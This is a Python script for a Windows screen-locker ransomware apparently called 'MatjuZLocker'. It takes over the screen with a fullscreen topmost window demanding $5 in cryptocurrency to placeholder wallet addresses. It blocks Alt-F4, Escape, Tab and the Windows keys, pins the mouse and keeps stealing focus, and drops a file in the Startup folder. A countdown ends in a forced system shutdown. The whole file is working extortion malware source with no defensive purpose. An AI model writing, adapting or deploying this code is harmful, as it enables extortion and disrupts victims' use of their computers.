from tkinter import *
import pyautogui
import os

PASSWORD = "123123"
TIMER_SECONDS = 600
LOCK_FILE = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\system.logger")

BTC = "BTC: bc1qxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
LTC = "LTC: ltc1qxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
ETH = "ETH: 0xXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"

ASCII_ART = """
                            ▒▒▒▒▒▒                                                            
                          ▒▒▒▒▒▒▒▒▒▒                                                          
                    ▒▒▒▒  ▒▒▒▒▒▒▒▒▒▒                                                          
                  ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒                                                          
                  ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒                ██████████                                  
                  ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒            ████▒▒░░░░░░▒▒████                              
                    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒          ██░░░░░░░░░░░░░░░░░░████                          
                          ▒▒▒▒▒▒▒▒        ██░░░░░░░░░░░░░░░░░░░░░░░░██                        
                                          ██░░░░░░░░░░░░░░░░██░░░░░░░░██                      
                                ████████████░░░░░░░░░░░░░░██░░░░░░░░░░██                      
                            ████░░░░░░░░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓                    
                        ████░░░░░░░░░░░░░░░░░░██░░░░░░██████░░░░░░░░░░░░██                    
                      ██░░▒▒░░░░░░░░██░░░░░░░░░░████░░██░░░░██░░░░░░░░░░░░██                  
                    ██░░░░░░░░░░░░░░██░░░░░░░░░░██░░░░██░░░░░░██░░░░░░░░░░░░██                
                  ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░░██░░░░██░░░░░░░░░░░░▒▒██              
                  ██░░░░░░░░░░░░████████░░░░░░░░░░██░░░░░░██████░░░░░░░░░░░░░░░░██            
                ██░░░░░░░░░░░░██░░░░░░░░██░░░░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░██            
                ██░░░░░░░░░░██░░░░░░░░░░██░░░░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██          
              ██░░░░░░░░░░░░██░░░░░░░░██  ░░░░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██          
              ██░░░░░░░░░░░░██████████░░░░████░░██▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██          
              ██░░░░░░░░░░░░          ░░░░░░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██          
            ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██        
            ██░░░░░░░░░░  ░░░░░░░░░░░░░░    ▒▒██▒▒░░░░░░░░▒▒▒▒░░░░▒▒░░░░░░░░░░░░░░░░██        
            ██░░░░░░░░    ░░░░░░░░░░░░░░    ░░░░▓▓░░░░░░░░░░░░░░▒▒▒▒░░░░░░░░░░░░░░░░██        
            ██░░░░░░░░      ░░░░░░░░░░░░░░  ░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██        
            ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██        
            ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██        
            ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██        
            ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██          
████████      ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██          
▒▒▒▒▒▒▒▒████  ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░██████░░░░░░░░░░░░████░░░░░░░░██  ██████████
▒▒▒▒▒▒▒▒▒▒▒▒████████░░░░██████░░░░░░██████░░░░██████▒▒████████████▒▒██▒▒████████████▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████▒▒██████████▒▒████████▒▒██▒▒██▒▒▒▒▒▒▒▒▒▒▒▒██▒▒██▒▒▒▒▒▒▒▒▒▒▒▒████████
████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒██▒▒▒▒▒▒██▒▒██▒▒▒▒▒▒████▒▒████████████████░░██████████████        
        ██████████████▓▓██▒▒██████████▒▒████████    ██  ██▒▒░░░░░░░░░░██▒▒░░▒▒██              
                      ██░░██          ██    ░░██        ██░░░░░░░░░░░░░░░░░░░░██              
                      ██░░░░░░░░░░░░░░░░░░░░░░██        ██░░░░░░░░░░░░░░░░░░░░██              
                        ██░░░░░░░░░░░░░░░░░░░░██        ██░░░░░░░░░░░░░░░░░░░░██              
                          ██░░░░░░░░░░░░░░░░██            ██░░░░░░░░░░░░░░░░░░██              
                            ██░░░░░░░░░░░░░░██            ██░░░░██░░░░░░░░░░░░██              
                            ██░░░░░░░░░░░░░░██              ██░░██░░░░░░██░░░░██              
                              ██░░░░░░░░░░░░██              ██░░██░░░░░░██░░░░██              
                                ██░░░░░░░░██                ████  ██░░██  ██░░██              
                                  ██░░░░░░██                      ██░░██  ████                
                                    ██████                        ████                                                                                                        
"""

class MatjuZLocker:
    def __init__(self):
        self.root = Tk()
        self.root.title("match locker")
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.configure(bg="#0a0a0a")
        self.root.config(cursor="none")

        pyautogui.FAILSAFE = False

        self.time_left = TIMER_SECONDS
        self.unlocked = False

        self.setup_ui()
        self.create_lockfile()
        self.start_countdown()
        self.block_keys()

        self.root.mainloop()

    def setup_ui(self):
        #основные надписи
        Label(self.root, text="Windows is blocked.",
              font="Impact 28 bold", fg="#555555", bg="#0a0a0a").place(x=520, y=180)

        Label(self.root, text="Transfer $5 for password :)",
              font="Impact 16 bold", fg="#777777", bg="#0a0a0a").place(x=330, y=250, width=800)

        #кошельки
        self.add_wallet("₿ BITCOIN", BTC, "./BTC-little.png", 320)
        self.add_wallet("Ł LITECOIN", LTC, "./LTC-little.png", 420)
        self.add_wallet("⟠ ETHEREUM", ETH, "./ETH-little.png", 520)

        #таймер
        self.timer_label = Label(self.root, text=str(self.time_left),
                                 font="TimesNewRoman 22 bold", fg="#888888", bg="#0a0a0a")
        self.timer_label.place(x=620, y=620)

        #поле ввода
        self.entry = Entry(self.root, fg="gray", bg="#111111", font="Consolas 24",
                           justify=CENTER, bd=4, relief="solid", insertbackground="#00ff00")
        self.entry.place(width=380, height=55, x=460, y=680)
        self.entry.bind("<Return>", self.check_password)
        self.entry.focus_force()

        #водяной знак
        Label(self.root, text="by matchattea0",
              font="Arial 10", fg="#444444", bg="#0a0a0a").place(x=600, y=745)

        Label(self.root, text=ASCII_ART, font="Consolas 11", fg="#333333", bg="#0a0a0a",
              justify=LEFT).place(x=1050, y=180)

    def add_wallet(self, name, addr, img_path, y):
        try:
            img = PhotoImage(file=img_path)
            Label(self.root, image=img, bg="#0a0a0a").place(x=380, y=y)
            self.root.__dict__[f"img_{name}"] = img
        except:
            pass

        Label(self.root, text=name, font="Consolas 17 bold", fg="#ffff00", bg="#0a0a0a").place(x=460, y=y)
        Label(self.root, text=addr, font="Consolas 14", fg="#aaaaaa", bg="#0a0a0a").place(x=460, y=y + 38)

    def create_lockfile(self):
        try:
            if os.path.exists(LOCK_FILE):
                self.time_left = 300
            open(LOCK_FILE, 'w', encoding='utf-8').close()
        except:
            pass

    def start_countdown(self):
        if self.unlocked:
            return
        self.timer_label.config(text=self.time_left)
        if self.time_left <= 0:
            self.timer_label.config(text="УНИЧТОЖЕНИЕ...", fg="#ff0000", font="Arial 28 bold")
            self.destroy_system()
            return
        self.time_left -= 1
        self.root.after(1000, self.start_countdown)

    def check_password(self, event=None):
        if self.entry.get().strip() == PASSWORD:
            self.unlocked = True
            self.root.destroy()

    def destroy_system(self):
        os.system('shutdown /s /t 15 /c "MATJUZ LOCKER: СИСТЕМА УНИЧТОЖАЕТСЯ..."')

    def block_keys(self):
        self.root.bind("<Alt-F4>", lambda e: "break")
        self.root.bind("<Escape>", lambda e: "break")
        self.root.bind("<Tab>", lambda e: "break")
        self.root.bind("<Control-Tab>", lambda e: "break")

        self.root.bind("<Super_L>", lambda e: "break")
        self.root.bind("<Super_R>", lambda e: "break")
        self.root.bind_all("<Key>", self.block_win_key)

        def force_top():
            if not self.unlocked:
                self.root.lift()
                self.root.focus_force()
                self.entry.focus_force()
                pyautogui.moveTo(660, 710)
                self.root.after(100, force_top)

        force_top()
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)

    def block_win_key(self, event):
        if event.keysym in ("Super_L", "Super_R", "win", "Win_L", "Win_R"):
            return "break"
        return None


if __name__ == "__main__":
    MatjuZLocker()